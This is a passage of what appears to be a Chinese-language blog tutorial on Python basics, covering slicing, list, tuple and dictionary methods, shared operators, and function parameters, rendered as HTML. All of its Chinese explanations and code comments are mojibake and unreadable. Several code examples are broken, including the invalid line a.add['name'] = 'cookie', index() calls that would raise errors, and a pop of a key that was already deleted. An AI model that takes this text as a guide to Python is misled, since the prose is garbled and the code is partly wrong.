class="comment">#å–åˆ°æœ€å</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[:<span class="number">2</span>])  <span class="comment">#å–å‰ä¸¤ä½</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[::-<span class="number">1</span>]) <span class="comment">#å€’åºè¾“å‡º è´Ÿå·è¡¨ç¤ºæ–¹å‘ï¼Œä»å³è¾¹å¾€å·¦éå†</span></span><br></pre></td></tr></table></figure>

<h5 id="0x02-åˆ—è¡¨"><a href="#0x02-åˆ—è¡¨" class="headerlink" title="0x02:åˆ—è¡¨"></a>0x02:åˆ—è¡¨</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æœ‰åºçš„æ•°æ®é›†åˆ</span><br><span class="line">1.å¯ä»¥éšæ—¶æ·»åŠ ã€åˆ é™¤å’Œä¿®æ”¹</span><br><span class="line">2.æ•°æ®æ˜¯å¯ä»¥å˜åŒ–çš„ï¼ˆæ•°æ®é¡¹å¯ä»¥å˜åŒ–ï¼Œä½†åœ°å€ä¸ä¼šæ”¹å˜</span><br><span class="line">3.ç”¨[]è¡¨ç¤ºåˆ—è¡¨ç±»å‹ï¼Œæ•°æ®é¡¹ä¹‹é—´ç”¨é€—å·åˆ†éš”ï¼Œæ³¨æ„ï¼šæ•°æ®é¡¹å¯ä»¥æ˜¯ä»»ä½•ç±»å‹çš„æ•°æ®</span><br><span class="line">4.æ”¯æŒç´¢å¼•å’Œåˆ‡ç‰‡æ¥è¿›è¡Œæ“ä½œ</span><br><span class="line"></span><br><span class="line">ç”¨forå¾ªç¯å¯å¯¹åˆ—è¡¨è¿›è¡Œéå†</span><br></pre></td></tr></table></figure>

<p>åˆ—è¡¨å®šä¹‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">li = []</span><br><span class="line">print(type(li))</span><br></pre></td></tr></table></figure>

<p>æ–¹æ³•ï¼š</p>
<table>
<thead>
<tr>
<th>append</th>
<th>åœ¨åˆ—è¡¨åé¢è¿½åŠ å…ƒç´ </th>
</tr>
</thead>
<tbody><tr>
<td>len</td>
<td>è¾“å‡ºåˆ—è¡¨ä¸­å…ƒç´ ä¸ªæ•°</td>
</tr>
<tr>
<td>count</td>
<td>ç»Ÿè®¡å…ƒç´ å‡ºç°çš„æ¬¡æ•°</td>
</tr>
<tr>
<td>extend</td>
<td>æ‰©å±•ï¼Œç›¸å½“äºæ‰¹é‡æ·»åŠ </td>
</tr>
<tr>
<td>index</td>
<td>è·å–æŒ‡å®šå…ƒç´ ç´¢å¼•å·</td>
</tr>
<tr>
<td>insert</td>
<td>åœ¨æŒ‡å®šä½ç½®æ’å…¥</td>
</tr>
<tr>
<td>pop</td>
<td>åˆ é™¤æœ€åä¸€ä¸ªå…ƒç´ </td>
</tr>
<tr>
<td>remove</td>
<td>ç§»é™¤å·¦è¾¹æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªå…ƒç´ </td>
</tr>
<tr>
<td>reverse</td>
<td>åè½¬åˆ—è¡¨</td>
</tr>
<tr>
<td>sort</td>
<td>åˆ—è¡¨æ’åº</td>
</tr>
</tbody></table>
<h6 id="1-å¸¸ç”¨æ–¹æ³•ä½¿ç”¨-1"><a href="#1-å¸¸ç”¨æ–¹æ³•ä½¿ç”¨-1" class="headerlink" title="1.å¸¸ç”¨æ–¹æ³•ä½¿ç”¨"></a>1.å¸¸ç”¨æ–¹æ³•ä½¿ç”¨</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥æ‰¾ æ”¯æŒåˆ‡ç‰‡</span></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;123&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(li)  <span class="comment">#è¾“å‡ºå®Œæˆçš„åˆ—è¡¨</span></span><br><span class="line"><span class="built_in">print</span>(li[<span class="number">0</span>]) <span class="comment">#è¾“å‡ºç¬¬ä¸€ä¸ªå…ƒç´ </span></span><br><span class="line"><span class="built_in">print</span>(li[<span class="number">1</span>:<span class="number">4</span>]) <span class="comment">#è¾“å‡ºç¬¬äºŒä¸ªåˆ°ç¬¬å››ä¸ªå…ƒç´ </span></span><br><span class="line"><span class="built_in">print</span>(li[<span class="number">2</span>:]) <span class="comment">#ç¬¬ä¸‰ä¸ªå…ƒç´ åˆ°æœ€å</span></span><br><span class="line"><span class="built_in">print</span>(li[::-<span class="number">1</span>])  <span class="comment">#å€’åºè¾“å‡º</span></span><br><span class="line"><span class="built_in">print</span>(li*<span class="number">2</span>)  <span class="comment">#å¤šæ¬¡è¾“å‡ºåˆ—è¡¨ä¸­çš„å…ƒç´ </span></span><br><span class="line"><span class="built_in">print</span>(li.index(<span class="number">20</span>))  <span class="comment">#è¿”å›æŸ¥æ‰¾å…ƒç´ çš„ä¸‹æ ‡</span></span><br><span class="line"><span class="built_in">print</span>(li.index())</span><br><span class="line"><span class="comment"># index(å…ƒç´ ,start,end)  startå’Œendéƒ½æ˜¯ä¸‹æ ‡å€¼</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¢åŠ  append() insert() extend()</span></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;123&#x27;</span>]</span><br><span class="line">li.append([<span class="string">&#x27;yer&#x27;</span>])  <span class="comment">#è¿½åŠ çš„æ˜¯åˆ—è¡¨</span></span><br><span class="line">li.append(<span class="string">&#x27;111&#x27;</span>) <span class="comment">#è¿½åŠ å…ƒç´ çš„æ—¶å€™åªèƒ½è¿½åŠ ä¸€ä¸ª</span></span><br><span class="line">li.insert(<span class="number">1</span>,<span class="string">&#x27;æ’å…¥æ•°æ®&#x27;</span>)  <span class="comment">#åœ¨æŒ‡å®šä½ç½®æ’å…¥å…ƒç´ </span></span><br><span class="line">d = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">11</span>))  <span class="comment">#å¼ºåˆ¶è½¬æ¢ä¸ºlistå¯¹è±¡</span></span><br><span class="line">li.extend(d) <span class="comment">#æ‰©å±•å¯ä»¥å°†å…¶ä»–åˆ—è¡¨ä¸­çš„å…ƒç´ å¢åŠ åˆ°è¿›è¡Œæ“ä½œçš„åˆ—è¡¨ä¹‹ä¸­ æ‰¹é‡å¢åŠ </span></span><br><span class="line">li.extend([<span class="string">&#x27;123&#x27;</span>,<span class="number">234</span>,<span class="string">&#x27;dc&#x27;</span>]) <span class="comment">#åŒä¸Š</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¿®æ”¹  </span></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;123&#x27;</span>]</span><br><span class="line">li[<span class="number">0</span>] = <span class="string">&#x27;tom&#x27;</span> <span class="comment">#å¯ä»¥ç›´æ¥ä¿®æ”¹ æ•°æ®ç±»å‹æ²¡æœ‰è¦æ±‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ é™¤ pop() del remove()</span></span><br><span class="line">li2 = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">10</span>,<span class="number">51</span>))</span><br><span class="line"><span class="keyword">del</span> li2[<span class="number">0</span>]  <span class="comment">#åˆ é™¤ç¬¬ä¸€ä½å…ƒç´ </span></span><br><span class="line"><span class="keyword">del</span> li2[<span class="number">1</span>:<span class="number">3</span>] <span class="comment">#åˆ©ç”¨åˆ‡ç‰‡è¿›è¡Œæ‰¹é‡åˆ é™¤å…ƒç´ </span></span><br><span class="line">li2.remove(<span class="number">20</span>) <span class="comment">#ç§»é™¤æŒ‡å®šçš„å…ƒç´ </span></span><br><span class="line">li2.pop(<span class="number">1</span>)  <span class="comment">#ç§»é™¤æŒ‡å®šä¸‹æ ‡çš„å…ƒç´ </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="0x03-å…ƒç»„"><a href="#0x03-å…ƒç»„" class="headerlink" title="0x03:å…ƒç»„"></a>0x03:å…ƒç»„</h5><p><strong>tuple</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å…ƒç»„ï¼šæ˜¯ä¸€ç§ä¸å¯å˜çš„åºåˆ—ï¼Œåœ¨åˆ›å»ºä¹‹åä¸èƒ½åšä»»ä½•çš„ä¿®æ”¹</span><br><span class="line">1.ä¸å¯å˜</span><br><span class="line">2.ç”¨()åˆ›å»ºå…ƒç»„ç±»å‹ï¼Œæ•°æ®é¡¹ç”¨é€—å·åˆ†éš”</span><br><span class="line">3.å¯ä»¥æ˜¯ä»»ä½•çš„ç±»å‹</span><br><span class="line">4.å½“å…ƒç»„ä¸­åªæœ‰ä¸€ä¸ªå…ƒç´ æ—¶ï¼Œè¦åŠ ä¸Šé€—å·ï¼Œä¸ç„¶è§£é‡Šå™¨ä¼šæŠŠå…ƒç»„å½“ä½œå…ƒç´ å¤„ç†</span><br><span class="line">5.æ”¯æŒåˆ‡ç‰‡æ“ä½œ</span><br></pre></td></tr></table></figure>

<p>å…ƒç»„åˆ›å»ºï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = (<span class="string">&#x27;123&#x27;</span>,<span class="number">123</span>,<span class="string">&#x27;yuer&#x27;</span>,[<span class="string">&#x27;111&#x27;</span>,<span class="number">111</span>,<span class="string">&#x27;yer&#x27;</span>],(<span class="string">&#x27;1&#x27;</span>,<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))  <span class="comment">#tuple</span></span><br></pre></td></tr></table></figure>

<h6 id="1-ç®€å•æ“ä½œ"><a href="#1-ç®€å•æ“ä½œ" class="headerlink" title="1.ç®€å•æ“ä½œ"></a>1.ç®€å•æ“ä½œ</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æŸ¥è¯¢==&gt;forå¾ªç¯ ç´¢å¼• åˆ‡ç‰‡</span></span><br><span class="line">a = (<span class="string">&#x27;123&#x27;</span>,<span class="number">123</span>,<span class="string">&#x27;yuer&#x27;</span>,[<span class="string">&#x27;111&#x27;</span>,<span class="number">111</span>,<span class="string">&#x27;yer&#x27;</span>],(<span class="string">&#x27;1&#x27;</span>,<span class="number">2</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">1</span>:<span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(a[::-<span class="number">1</span>])  <span class="comment">#å€’å™è¾“å‡º ä»å³å¾€å·¦ä¸‹æ ‡4ç›¸å½“äºä»å·¦å¾€å³ä¸‹æ ‡-1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a[<span class="number">3</span>])) <span class="comment">#åˆ—è¡¨ è™½ç„¶å…ƒç»„ä¸å¯ä¿®æ”¹ä½†æ˜¯å¯ä»¥å¯¹å…ƒç»„ä¸­çš„åˆ—è¡¨è¿›è¡Œä¿®æ”¹</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å†…ç½®æ–¹æ³• count  ç»Ÿè®¡å…ƒç´ åœ¨å…ƒç»„ä¸­å‡ºç°çš„æ¬¡æ•°</span></span><br><span class="line">a = (<span class="string">&#x27;123&#x27;</span>,<span class="number">123</span>,<span class="string">&#x27;yuer&#x27;</span>,[<span class="string">&#x27;111&#x27;</span>,<span class="number">111</span>,<span class="string">&#x27;yer&#x27;</span>],(<span class="string">&#x27;1&#x27;</span>,<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(a.count(<span class="string">&#x27;yuer&#x27;</span>)) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å†…ç½®æ–¹æ³• index  æŸ¥æ‰¾æŒ‡å®šå…ƒç´ åœ¨å…ƒç»„ä¸­çš„ä¸‹æ ‡ç´¢å¼•</span></span><br><span class="line">a = (<span class="string">&#x27;123&#x27;</span>,<span class="number">123</span>,<span class="string">&#x27;yuer&#x27;</span>,[<span class="string">&#x27;111&#x27;</span>,<span class="number">111</span>,<span class="string">&#x27;yer&#x27;</span>],(<span class="string">&#x27;1&#x27;</span>,<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(a.index(<span class="string">&#x27;yuer&#x27;</span>))  <span class="comment">#2</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tupleA = ()  <span class="comment">#ç©ºå…ƒç»„</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(tupleA))</span><br><span class="line">tupleA = (<span class="string">&#x27;adcd&#x27;</span>,<span class="number">11</span>,<span class="number">22</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(tupleA))</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¸¤æ¬¡çš„åœ°å€æ˜¯ä¸ä¸€æ ·çš„ å› ä¸ºå…ƒç»„æ˜¯ä¸å¯ä¿®æ”¹çš„</span></span><br></pre></td></tr></table></figure>

<h5 id="0x04-å­—å…¸"><a href="#0x04-å­—å…¸" class="headerlink" title="0x04:å­—å…¸"></a>0x04:å­—å…¸</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.å¯ä»¥å­˜å‚¨ä»»æ„å¯¹è±¡ï¼Œä»¥é”®å€¼å¯¹çš„å½¢å¼åˆ›å»ºçš„&#123;&#x27;key&#x27;:&#x27;value&#x27;&#125;åˆ©ç”¨å¤§æ‹¬å·åŒ…è£¹ï¼Œæ•°æ®é¡¹ç”¨é€—å·åˆ†éš”</span><br><span class="line">2.å­—å…¸ä¸­æ‰¾æŸä¸ªå…ƒç´ æ—¶ï¼Œæ˜¯æ ¹æ®é”®ã€å€¼å­—å…¸çš„æ¯ä¸ªå…ƒç´ ç”±2éƒ¨åˆ†ç»„æˆ</span><br><span class="line">3.åœ¨æˆ‘ä»¬ä¸ç¡®å®šå­—å…¸ä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªé”®è€Œåˆæƒ³è·å–å…¶å€¼çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨getæ–¹æ³•ï¼Œè¿˜å¯ä»¥è®¾ç½®é»˜è®¤å€¼</span><br><span class="line">4.å­—å…¸ä¸­é”®ä¸å¯é‡å¤ï¼Œå€¼å¯é‡å¤ï¼ˆå¦‚æœæœ‰é‡å¤çš„é”®ï¼Œåè€…ä¼šè¦†ç›–å‰è€…</span><br><span class="line">5.å­—å…¸çš„é”®åªèƒ½æ˜¯ä¸å¯å˜ç±»å‹ï¼šæ•°å­—ã€å­—ç¬¦ä¸²ã€å…ƒç»„ç­‰</span><br><span class="line">6.ä¸æ˜¯åºåˆ—ç±»å‹ï¼Œæ²¡æœ‰ä¸‹æ ‡æ¦‚å¿µï¼Œä¸èƒ½ä½¿ç”¨ç´¢å¼•ï¼Œæ˜¯pythonå†…ç½®çš„é«˜çº§æ•°æ®ç±»å‹</span><br></pre></td></tr></table></figure>

<h6 id="1-å¸¸ç”¨æ–¹æ³•"><a href="#1-å¸¸ç”¨æ–¹æ³•" class="headerlink" title="1.å¸¸ç”¨æ–¹æ³•"></a>1.å¸¸ç”¨æ–¹æ³•</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#åˆ›å»ºå­—å…¸</span></span><br><span class="line">a = &#123;&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¢åŠ æ•°æ® </span></span><br><span class="line">a = &#123;&#125;</span><br><span class="line">a[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;yuer&#x27;</span> <span class="comment">#   key:value</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#å…ƒç´ æ ¼å¼</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;male&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(a))  <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è·å–å…ƒç´  keys() values() items()</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;male&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(a[<span class="string">&#x27;name&#x27;</span>]) <span class="comment">#åªèƒ½é€šè¿‡é”®è·å–å€¼ï¼Œå¹¶ä¸”å€¼å¯ä»¥ä¿®æ”¹</span></span><br><span class="line"><span class="built_in">print</span>(a.keys())  <span class="comment">#è·å–æ‰€æœ‰çš„é”®</span></span><br><span class="line"><span class="built_in">print</span>(a.values()) <span class="comment">#è·å–å€¼</span></span><br><span class="line"><span class="built_in">print</span>(a.items())  <span class="comment">#è·å–æ‰€æœ‰çš„é”®å€¼å¯¹ï¼Œä¹Ÿå¯ä»¥é€šè¿‡forå¾ªç¯éå†</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¿®æ”¹æ•°æ® update() add[]</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;male&#x27;</span>&#125;</span><br><span class="line">a.update(&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;cookie&#x27;</span>&#125;) <span class="comment">#æ›´æ–°æ•°æ® </span></span><br><span class="line">a.update(&#123;<span class="string">&#x27;age&#x27;</span>:<span class="string">&#x27;18&#x27;</span>&#125;)  <span class="comment">#å¢åŠ æ•°æ®</span></span><br><span class="line">a.add[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;cookie&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ é™¤æ•°æ® del pop</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;male&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">del</span> a[<span class="string">&#x27;name&#x27;</span>]   <span class="comment">#åˆ é™¤æŒ‡å®šé”®</span></span><br><span class="line">a.pop(<span class="string">&#x27;name&#x27;</span>)  <span class="comment">#åˆ é™¤æŒ‡å®šé”®</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ’åºæ“ä½œ sorted()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(a.items(),key=<span class="keyword">lambda</span> d:d[<span class="number">0</span>])) <span class="comment">#æŒ‰ç…§keyæ’åº</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(a.items(),key=<span class="keyword">lambda</span> d:d[<span class="number">1</span>])) <span class="comment">#æŒ‰valueæ’åºï¼Œä½†æ˜¯æ•°æ®ç±»å‹è¦ä¸€è‡´</span></span><br><span class="line"><span class="comment"># åœ¨å‡½æ•°sorted(a.items(), key = lambda d:d[1])ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¼ ç»™ç¬¬äºŒä¸ªå‚æ•°â€œé”®-é”®å€¼â€ï¼Œç¬¬äºŒä¸ªå‚æ•°å–å‡ºå…¶ä¸­çš„é”®([0])æˆ–é”®å€¼(1])</span></span><br></pre></td></tr></table></figure>

<h5 id="0x05-å…¬ç”¨æ–¹æ³•"><a href="#0x05-å…¬ç”¨æ–¹æ³•" class="headerlink" title="0x05:å…¬ç”¨æ–¹æ³•"></a>0x05:å…¬ç”¨æ–¹æ³•</h5><h6 id="1-åˆå¹¶æ“ä½œ"><a href="#1-åˆå¹¶æ“ä½œ" class="headerlink" title="1.åˆå¹¶æ“ä½œ +"></a>1.åˆå¹¶æ“ä½œ +</h6><p><em>ä½¿ç”¨å­—ç¬¦ä¸²ã€åˆ—è¡¨ã€å…ƒç»„</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line">b = <span class="string">&#x27;123&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a+b)   <span class="comment">#yuer123</span></span><br><span class="line"></span><br><span class="line">listA = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">listB = [<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]</span><br><span class="line"><span class="built_in">print</span>(listA+listB)  <span class="comment">#[1, 2, 3, 7, 8, 9]</span></span><br><span class="line"></span><br><span class="line">tupleA = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">tupleB = (<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(tupleA+tupleB)  <span class="comment">#(1, 2, 3, 4, 5, 6)</span></span><br></pre></td></tr></table></figure>

<h6 id="2-å¤åˆ¶"><a href="#2-å¤åˆ¶" class="headerlink" title="2.å¤åˆ¶  *"></a>2.å¤åˆ¶  *</h6><p><em>å­—ç¬¦ä¸²ã€åˆ—è¡¨ã€å…ƒç»„</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">listA = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(listA*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">tupleA = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(tupleA*<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<h6 id="3-inåˆ¤æ–­å…ƒç´ æ˜¯å¦å­˜åœ¨"><a href="#3-inåˆ¤æ–­å…ƒç´ æ˜¯å¦å­˜åœ¨" class="headerlink" title="3.inåˆ¤æ–­å…ƒç´ æ˜¯å¦å­˜åœ¨"></a>3.inåˆ¤æ–­å…ƒç´ æ˜¯å¦å­˜åœ¨</h6><p><em>å­—ç¬¦ä¸²ã€åˆ—è¡¨ã€å…ƒç»„ã€å­—å…¸</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a&#x27;</span> <span class="keyword">in</span> a)  <span class="comment">#boolå€¼</span></span><br><span class="line"></span><br><span class="line">dic = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;age&#x27;</span> <span class="keyword">in</span> dic) <span class="comment">#è¿›è¡Œé”®æŸ¥è¯¢</span></span><br></pre></td></tr></table></figure>

<h3 id="4-pythonå‡½æ•°åŸºç¡€"><a href="#4-pythonå‡½æ•°åŸºç¡€" class="headerlink" title="4.pythonå‡½æ•°åŸºç¡€"></a>4.pythonå‡½æ•°åŸºç¡€</h3><h5 id="0x01-å‡½æ•°åŸºç¡€"><a href="#0x01-å‡½æ•°åŸºç¡€" class="headerlink" title="0x01:å‡½æ•°åŸºç¡€"></a>0x01:å‡½æ•°åŸºç¡€</h5><p><u>å‡½æ•°å®šä¹‰ï¼š</u></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def å…³é”®å­— å°æ‹¬å· :</span><br><span class="line">	ä»£ç å—</span><br><span class="line">	</span><br><span class="line">def å‡½æ•°å(å‚æ•°åˆ—è¡¨):</span><br><span class="line">	ä»£ç å—</span><br></pre></td></tr></table></figure>

<p><u>å‡½æ•°è¯´æ˜æ–‡æ¡£ï¼š</u></p>
<p>å‡½æ•°å†…å®¹çš„ç¬¬ä¸€è¡Œå¯ä»¥ç”¨å­—ç¬¦ä¸²è¿›è¡Œå‡½æ•°è¯´æ˜</p>
<hr>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inform</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    ç”¨äºè¾“å‡ºä¿¡æ¯</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;my name is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&#x27;yuer&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;my age is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">11</span>))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºä¸åŒçš„ä¿¡æ¯ï¼Œç”¨å‚æ•°å®ç°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inform</span>(<span class="params">name,age</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    è‡ªæˆ‘ä»‹ç»æ¨¡æ¿</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;my name is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(name))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;my age is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(age))</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h5 id="0x02-å‡½æ•°å‚æ•°"><a href="#0x02-å‡½æ•°å‚æ•°" class="headerlink" title="0x02:å‡½æ•°å‚æ•°"></a>0x02:å‡½æ•°å‚æ•°</h5><p>å‚æ•°åˆ†ç±»ï¼š</p>
<p>å¿…é€‰å‚æ•°ã€é»˜è®¤å‚æ•°ï¼ˆç¼ºçœå‚æ•°ï¼‰ã€å¯é€‰å‚æ•°ã€å…³é”®å­—å‚æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‚æ•°ï¼šå‡½æ•°ä¸ºäº†å®ç°æŸé¡¹ç‰¹å®šåŠŸèƒ½ï¼Œè¿›è€Œä¸ºäº†å¾—åˆ°å®ç°åŠŸèƒ½æ‰€éœ€è¦çš„æ•°æ®ï¼Œä¸ºäº†å¾—åˆ°å¤–éƒ¨æ•°æ®</span><br><span class="line">å¿…é€‰å‚æ•°ï¼šåœ¨å‡½æ•°è°ƒç”¨çš„æ—¶å€™å¿…é¡»è¦èµ‹å€¼</span><br><span class="line">é»˜è®¤å‚æ•°ï¼š</span><br><span class="line"></span><br><span class="line"># å®šä¹‰å‡½æ•°å­¦ä¹ å‚æ•°</span><br></pre></td></tr></table></figure>

<h6 id="å¿…é€‰å‚æ•°"><a href="#å¿…é€‰å‚æ•°" class="headerlink" title="#å¿…é€‰å‚æ•°"></a>#å¿…é€‰å‚æ•°</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params">a,b</span>):</span>  </span><br><span class="line">    <span class="comment">#a,bä¸ºå½¢å‚ï¼Œåœ¨å®šä¹‰çš„æ—¶å€™ä¸å å†…å­˜åœ°å€</span></span><br><span class="line">    <span class="built_in">sum</span> = a + b</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">a,b = <span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">input</span>().split())</span><br><span class="line"><span class="built_in">sum</span>(a,b) <span class="comment">#è°ƒç”¨å‚æ•° è¿™é‡Œçš„a,bæ˜¯å®å‚ï¼Œå ç”¨å†…å­˜åœ°å€</span></span><br><span class="line"><span class="built_in">sum</span>()  <span class="comment">#ç›´æ¥è°ƒç”¨ä¼šæŠ¥é”™ï¼Œå¿…é¡»è¦æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œå› æ­¤æ˜¯å¿…é€‰å‚æ•°</span></span><br></pre></td></tr></table></figure>

<h6 id="é»˜è®¤å‚æ•°"><a href="#é»˜è®¤å‚æ•°" class="headerlink" title="#é»˜è®¤å‚æ•°"></a>#é»˜è®¤å‚æ•°</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å§‹ç»ˆå­˜åœ¨äºå‚æ•°åˆ—è¡¨ä¸­çš„å°¾éƒ¨</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params">a=<span class="number">20</span>,b=<span class="number">30</span></span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;é»˜è®¤å‚æ•°çš„ä½¿ç”¨=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(a+b))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">sum</span>()  <span 